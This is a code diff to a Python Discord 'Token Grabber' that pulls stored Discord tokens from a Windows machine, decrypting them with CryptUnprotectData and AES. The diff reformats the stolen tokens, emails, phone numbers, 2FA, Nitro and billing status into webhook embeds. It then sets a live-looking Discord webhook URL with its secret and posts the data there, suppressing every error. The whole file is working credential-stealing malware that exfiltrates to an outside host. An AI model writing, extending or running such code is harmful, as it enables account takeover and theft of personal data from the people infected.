@@ -6,6 +6,7 @@ import requests
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 from typing import List, Dict, Optional, Any
+from datetime import datetime
 
 class TokenExtractor:
     def __init__(self):
@@ -196,78 +197,66 @@ class TokenExtractor:
             base_info["valid"] = False
             
         return base_info
-
+    
 class DiscordWebhook:
-    def __init__(self, webhook_url: str):
+    def __init__(
+        self,
+        webhook_url: str,
+        username: str = "Token Grabber",
+        avatar_url: str = "https://i.pinimg.com/736x/59/67/20/5967205896bf4fbbdfd2c64521ef1bda.jpg",
+        embed_color: int = 0x2F3136,  
+        chunk_size: int = 10
+    ):
         self.webhook_url = webhook_url
-        
+        self.username = username
+        self.avatar_url = avatar_url
+        self.embed_color = embed_color
+        self.chunk_size = chunk_size
+
     def send_tokens(self, token_info_list: List[Dict[str, Any]]) -> bool:
         if not token_info_list:
             return False
-            
-        embeds = [{
-            "color": 0xb869a3,
-            "footer": {
-                "text": f"Total Tokens Found: {len(token_info_list)}"
-            }
-        }]
-        
-        for info in token_info_list:
-            token_embed = {
-                "title": f"👤 {info['username']}",
-                "description": f"**Token:** ||`{info['token']}`||\n**ID:** `{info['id']}`\n**Email:** `{info['email']}`\n**Phone:** `{info['phone']}`\n**2FA:** `{info['mfa']}`\n**Nitro:** `{info['nitro']}`\n**Billing:** `{info['billing']}`\n**Source:** `{info['source']}`",
-                "color": 0x5865F2,
-                "thumbnail": {"url": info['avatar']} if info['avatar'] else None,
-                "fields": []
-            }
-            
-            if "guilds_count" in info:
-                guild_info = f"**Total:** `{info.get('guilds_count', '?')}`\n**Admin:** `{info.get('admin_guilds_count', '?')}`\n**Owned:** `{info.get('owned_guilds_count', '?')}`"
-                
-                if info.get("important_guilds"):
-                    guild_info += "\n\n**Notable Servers:**\n"
-                    for guild in info["important_guilds"]:
-                        role = "Owner" if guild["owner"] else "Admin"
-                        guild_info += f"`{guild['name']}` ({role})\n"
-                
-                token_embed["fields"].append({
-                    "name": "🛡️ Servers",
-                    "value": guild_info,
-                    "inline": True
-                })
-            
-            if "friends_count" in info:
-                token_embed["fields"].append({
-                    "name": "👥 Friends",
-                    "value": f"`{info['friends_count']}`",
-                    "inline": True
-                })
-                
-            embeds.append(token_embed)
-        
-        embed_chunks = [embeds[i:i+10] for i in range(0, len(embeds), 10)]
-        
-        success = True
-        for chunk in embed_chunks:
-            try:
-                payload = {
-                    "username": "Token Gatherer",
-                    "avatar_url": "https://i.pinimg.com/736x/82/32/35/823235534eab0f3bef0ca979aa425e9d.jpg",
-                    "embeds": chunk
-                }
-                
-                response = requests.post(
-                    self.webhook_url,
-                    json=payload,
-                    headers={"Content-Type": "application/json"},
-                    timeout=5
-                )
-                success = success and response.status_code == 204
-            except Exception:
-                success = False
-        
-        return success
 
+        embeds = []
+
+        for idx, info in enumerate(token_info_list, 1):
+            fields = [
+                {"name": "User Token", "value": f"||**`{info['token']}`**||", "inline": False},
+                {"name": "User Information", "value": f"ID: `{info['id']}`\nUsername: `{info['username']}`", "inline": False},
+                {"name": "Contact Details", "value": f"Email: `{info['email']}`\nPhone: `{info['phone']}`", "inline": False},
+                {"name": "Account Status", "value": f"2FA: `{info['mfa']}`\nNitro: `{info['nitro']}`\nBilling: `{info['billing']}`", "inline": False},
+            ]
+
+            if "guilds_count" in info:
+                guilds = info.get("guilds_count", 0)
+                fields.append({"name": "Guild Information", "value": f"Total Guilds: `{guilds}`", "inline": False})
+
+            embed = {
+                "title": "New Token!",
+                "color": self.embed_color,
+                "fields": fields,
+                "thumbnail": {"url": info['avatar']} if info.get('avatar') else None,
+                "footer": {"text": f"Token {idx}/{len(token_info_list)}"},
+                "timestamp": datetime.utcnow().isoformat()
+            }
+            embeds.append(embed)
+
+        chunks = [embeds[i:i + self.chunk_size] for i in range(0, len(embeds), self.chunk_size)]
+        success = True
+
+        for chunk in chunks:
+            payload = {
+                "username": self.username,
+                "avatar_url": self.avatar_url,
+                "embeds": chunk
+            }
+            try:
+                r = requests.post(self.webhook_url, json=payload, headers={"Content-Type": "application/json"}, timeout=5)
+                success &= (r.status_code == 204)
+            except:
+                success = False
+
+        return success
 def main(webhook_url: str):
     extractor = TokenExtractor()
     token_info_list = extractor.extract()
@@ -277,9 +266,8 @@ def main(webhook_url: str):
         webhook.send_tokens(token_info_list)
 
 if __name__ == "__main__":
-    WEBHOOK_URL = "https://discord.com/api/webhooks/ ? "
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1379789949959667712/2WDKEyBldr1lN9WoJsDB8Pmp4NVFUWmhXqEme1LaSiDW7N6LHzc3RLBfEi9azK12Qv3o"
     try:
-        import uuid 
         main(WEBHOOK_URL)
     except Exception:
         pass
